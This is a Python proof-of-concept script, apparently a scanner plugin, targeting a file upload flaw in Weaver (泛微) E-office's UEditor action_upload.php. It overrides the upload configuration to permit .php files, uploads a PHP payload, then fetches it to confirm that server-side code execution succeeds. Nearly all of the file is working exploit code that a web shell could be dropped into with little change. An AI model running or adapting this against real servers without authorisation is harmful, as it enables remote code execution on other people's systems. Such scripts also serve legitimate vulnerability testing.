import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
        }
        filename = "test567"
        path = 'newplugins/js/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=/newplugins/js/ueditor/php/test/' + filename + '&CONFIG[imageMaxSize]=10000&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=yourfile'
        files = {'yourfile': ('yourfile.php', "<?php echo md5('123456');@unlink(__file__);?>")}
        base_resp = requests.get(url1+path,files=files,cookies=s_cookie,proxies=proxies,headers=headers, verify=False,timeout=10)
        if  base_resp.status_code == 200:
            path1 = 'newplugins/js/ueditor/php/test/' + filename + '.php'
            resp1 = requests.get(url1+path1,cookies=s_cookie,proxies=proxies,headers=headers,verify=False,timeout=10)
            if resp1.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in resp1.text:
                cdd="[+]漏洞存在\n"+str(path1)
            else:
                cdd = '[-]漏洞不存在_2\n'
        else:
            cdd='[-]漏洞不存在_1\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 E-office action_upload.php文件上传 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)